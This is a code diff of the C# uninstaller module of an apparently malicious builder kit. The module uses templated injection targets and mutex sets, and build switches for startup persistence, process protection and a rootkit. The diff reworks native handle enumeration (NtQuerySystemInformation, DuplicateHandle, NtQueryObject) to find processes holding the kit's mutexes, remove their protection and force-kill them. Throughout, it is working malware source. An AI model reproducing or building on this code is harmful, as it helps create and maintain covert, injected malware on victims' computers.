@@ -5,6 +5,7 @@ using System.Reflection;
 using System.Security.Principal;
 using System.Security.Cryptography;
 using System.Runtime.InteropServices;
+using System.Runtime.ExceptionServices;
 using System.Text;
 using System.Resources;
 using System.Threading;
@@ -28,6 +29,12 @@ public partial class _rUninstaller_
         catch { }
 #endif
 
+        try
+        {
+            KillProcesses();
+        }
+        catch { }
+
 #if DefStartup
         try
         {
@@ -42,12 +49,6 @@ public partial class _rUninstaller_
         }
         catch { }
 #endif
-
-        try
-        {
-            KillProcesses();
-        }
-        catch { }
 
         Thread.Sleep(3000);
         try
@@ -109,25 +110,24 @@ public partial class _rUninstaller_
         catch { }
     }
 
-    [StructLayout(LayoutKind.Sequential, Pack = 1)]
-    private struct SYSTEM_HANDLE_INFORMATION
+    [StructLayout(LayoutKind.Sequential)]
+    private struct SYSTEM_HANDLE_INFORMATION_EX
     {
-        public ushort ProcessID;
-        public ushort CreatorBackTrackIndex;
-        public byte ObjectType;
-        public byte HandleAttribute;
-        public ushort Handle;
-        public IntPtr Object_Pointer;
-        public IntPtr AccessMask;
+        public ulong NumberOfHandles;
+        public ulong Reserved;
     }
 
-    private enum OBJECT_INFORMATION_CLASS : int
+    [StructLayout(LayoutKind.Sequential)]
+    private struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
     {
-        ObjectBasicInformation = 0,
-        ObjectNameInformation = 1,
-        ObjectTypeInformation = 2,
-        ObjectAllTypesInformation = 3,
-        ObjectHandleInformation = 4
+        public IntPtr Object;
+        public IntPtr UniqueProcessId;
+        public IntPtr HandleValue;
+        public uint GrantedAccess;
+        public ushort CreatorBackTraceIndex;
+        public ushort ObjectTypeIndex;
+        public uint HandleAttributes;
+        public uint Reserved;
     }
 
     [StructLayout(LayoutKind.Sequential, Pack = 1)]
@@ -160,10 +160,10 @@ public partial class _rUninstaller_
     }
 
     [DllImport("ntdll.dll")]
-    private static extern uint NtQuerySystemInformation(int SystemInformationClass, IntPtr SystemInformation, int SystemInformationLength, ref int returnLength);
+    private static extern uint NtQueryObject(IntPtr ObjectHandle, int ObjectInformationClass, IntPtr ObjectInformation, ulong ObjectInformationLength, ref ulong returnLength);
 
     [DllImport("kernel32.dll")]
-    private static extern IntPtr OpenProcess(PROCESS_ACCESS_FLAGS dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, int dwProcessId);
+    private static extern IntPtr OpenProcess(PROCESS_ACCESS_FLAGS dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwProcessId);
 
     [DllImport("kernel32.dll", SetLastError = true)]
     [return: MarshalAs(UnmanagedType.Bool)]
@@ -172,96 +172,125 @@ public partial class _rUninstaller_
     [DllImport("kernel32.dll")]
     private static extern IntPtr GetCurrentProcess();
 
-    [DllImport("ntdll.dll")]
-    private static extern int NtQueryObject(IntPtr ObjectHandle, int ObjectInformationClass, IntPtr ObjectInformation, int ObjectInformationLength, ref int returnLength);
-
     [DllImport("kernel32.dll")]
     private static extern bool CloseHandle(IntPtr hObject);
 
-    [DllImport("kernel32.dll")]
-    private static extern bool GetHandleInformation(IntPtr hObject, out uint lpdwFlags);
+    [DllImport("ntdll.dll")]
+    private static extern uint NtQuerySystemInformation(int SystemInformationClass, IntPtr SystemInformation, ulong SystemInformationLength, ref ulong returnLength);
 
     private const uint STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;
+    private const int ExtendedSystemHandleInformation = 64;
+
+    private const int ObjectNameInformation = 1;
     private const int DUPLICATE_SAME_ACCESS = 0x2;
-    private const int SystemHandleInformation = 16;
+
+    private static IntPtr AllocateBuffer(ulong initialSize, Func<IntPtr, ulong, uint> action)
+    {
+        ulong size = initialSize;
+        IntPtr buffer = Marshal.AllocHGlobal((int)size);
+
+        try
+        {
+            uint status;
+            while ((status = action(buffer, size)) == STATUS_INFO_LENGTH_MISMATCH)
+            {
+                size *= 2;
+                Marshal.FreeHGlobal(buffer);
+                buffer = Marshal.AllocHGlobal((int)size);
+            }
+
+            if (status != 0)
+            {
+                Marshal.FreeHGlobal(buffer);
+                return IntPtr.Zero;
+            }
+
+            return buffer;
+        }
+        catch
+        {
+            Marshal.FreeHGlobal(buffer);
+            throw;
+        }
+    }
 
     private static void KillProcesses()
     {
         string[] processNames = new string[] { $INJECTIONTARGETS };
-        List<int> processIds = new List<int>();
+        List<uint> processIds = new List<uint>();
 
         foreach (var process in Process.GetProcesses())
         {
             if (Array.IndexOf(processNames, process.ProcessName.ToLowerInvariant() + ".exe") >= 0)
             {
-                processIds.Add(process.Id);
+                processIds.Add((uint)process.Id);
             }
         }
 
         string[] mutexes = new string[] { $MUTEXSET };
 
-        int structSize = Marshal.SizeOf(typeof(SYSTEM_HANDLE_INFORMATION));
-        int returnLength = structSize;
-        IntPtr handleInfoPtr = Marshal.AllocHGlobal(structSize);
-        while (NtQuerySystemInformation(SystemHandleInformation, handleInfoPtr, returnLength, ref returnLength) == STATUS_INFO_LENGTH_MISMATCH)
-        {
-            Marshal.FreeHGlobal(handleInfoPtr);
-            handleInfoPtr = Marshal.AllocHGlobal(returnLength);
-        }
-        long handleCount = Marshal.ReadInt64(handleInfoPtr);
-        IntPtr handleEntryPtr = handleInfoPtr + 8;
-        for (long i = 0; i < handleCount; i++)
-        {
-            SYSTEM_HANDLE_INFORMATION handle = (SYSTEM_HANDLE_INFORMATION)Marshal.PtrToStructure(handleEntryPtr, typeof(SYSTEM_HANDLE_INFORMATION));
-            if (handle.ProcessID > 0 && processIds.Contains(handle.ProcessID) && mutexes.Contains(GetMutexNameFromHandle(handle, handle.ProcessID)))
-            {
-#if DefProcessProtect
-                UnProtect(handle.ProcessID);
-#endif
-                Command("cmd", string.Format("/c taskkill /f /PID \"{0}\"", handle.ProcessID)); 
-            }
-            handleEntryPtr += structSize;
-        }
-        Marshal.FreeHGlobal(handleInfoPtr);
-    }
+        ulong structSize = (ulong)Marshal.SizeOf(typeof(SYSTEM_HANDLE_INFORMATION_EX));
+        ulong handleEntrySize = (ulong)Marshal.SizeOf(typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));
 
-    private static string GetMutexNameFromHandle(SYSTEM_HANDLE_INFORMATION systemHandleInformation, int processID)
-    {
-        IntPtr ipHandle = IntPtr.Zero;
-        IntPtr openProcessHandle = IntPtr.Zero;
-        IntPtr hObjectName = IntPtr.Zero;
+        IntPtr handleInfoPtr = AllocateBuffer(structSize, (buf, len) => NtQuerySystemInformation(ExtendedSystemHandleInformation, buf, len, ref len));
+
+        if (handleInfoPtr == IntPtr.Zero) return;
+
         try
         {
-            PROCESS_ACCESS_FLAGS flags = PROCESS_ACCESS_FLAGS.DupHandle | PROCESS_ACCESS_FLAGS.VMRead;
-            openProcessHandle = OpenProcess(flags, false, processID);
-            if (!DuplicateHandle(openProcessHandle, new IntPtr(systemHandleInformation.Handle), GetCurrentProcess(), out ipHandle, 0, false, DUPLICATE_SAME_ACCESS)) return null;
-            int nLength = 512;
-            hObjectName = Marshal.AllocHGlobal(512);
+            SYSTEM_HANDLE_INFORMATION_EX handleInfo = (SYSTEM_HANDLE_INFORMATION_EX)Marshal.PtrToStructure(handleInfoPtr, typeof(SYSTEM_HANDLE_INFORMATION_EX));
+            IntPtr handleEntryPtr = handleInfoPtr + Marshal.SizeOf(typeof(SYSTEM_HANDLE_INFORMATION_EX));
 
-            while ((uint)NtQueryObject(ipHandle, (int)OBJECT_INFORMATION_CLASS.ObjectNameInformation, hObjectName, nLength, ref nLength) == STATUS_INFO_LENGTH_MISMATCH)
+            for (ulong i = 0; i < handleInfo.NumberOfHandles; i++)
             {
-                Marshal.FreeHGlobal(hObjectName);
-                if (nLength == 0) return null;
-                hObjectName = Marshal.AllocHGlobal(nLength);
+                SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handle = (SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)Marshal.PtrToStructure(handleEntryPtr, typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));
+                uint processID = (uint)handle.UniqueProcessId.ToInt64();
+                if (processIds.Contains(processID))
+                {
+                    IntPtr processHandle = OpenProcess(PROCESS_ACCESS_FLAGS.DupHandle, false, processID);
+
+                    string handleName = GetHandleName(processHandle, handle.HandleValue);
+                    if (!string.IsNullOrWhiteSpace(handleName) && mutexes.Contains(handleName))
+                    {
+#if DefProcessProtect
+                        UnProtect((int)processID);
+#endif
+                        Command("cmd", string.Format("/c taskkill /f /PID \"{0}\"", processID));
+                    }
+
+                    CloseHandle(processHandle);
+                }
+
+                handleEntryPtr += (int)handleEntrySize;
             }
-            OBJECT_NAME_INFORMATION objObjectName = (OBJECT_NAME_INFORMATION)Marshal.PtrToStructure(hObjectName, typeof(OBJECT_NAME_INFORMATION));
-            if (objObjectName.Name.Buffer != IntPtr.Zero)
-            {
-                return Marshal.PtrToStringUni(objObjectName.Name.Buffer);
-            }
-        }
-        catch (Exception ex)
-        {
-            Console.WriteLine(ex.Message);
         }
         finally
         {
-            Marshal.FreeHGlobal(hObjectName);
-
-            CloseHandle(ipHandle);
-            CloseHandle(openProcessHandle);
+            Marshal.FreeHGlobal(handleInfoPtr);
         }
-        return null;
+    }
+
+    private static string GetHandleName(IntPtr sourceProcessHandle, IntPtr sourceHandle)
+    {
+        IntPtr targetHandle;
+        if (!DuplicateHandle(sourceProcessHandle, sourceHandle, GetCurrentProcess(), out targetHandle, 0, false, DUPLICATE_SAME_ACCESS)) return null;
+
+        try
+        {
+            IntPtr buffer = AllocateBuffer(512, (buf, len) => NtQueryObject(targetHandle, ObjectNameInformation, buf, len, ref len));
+
+            if (buffer == IntPtr.Zero) return null;
+
+            OBJECT_NAME_INFORMATION objectNameInfo = (OBJECT_NAME_INFORMATION)Marshal.PtrToStructure(buffer, typeof(OBJECT_NAME_INFORMATION));
+            string name = objectNameInfo.Name.Buffer != IntPtr.Zero ? Marshal.PtrToStringUni(objectNameInfo.Name.Buffer) : null;
+
+            Marshal.FreeHGlobal(buffer);
+            return name;
+        }
+        finally
+        {
+            CloseHandle(targetHandle);
+        }
     }
 
 #if DefRootkit
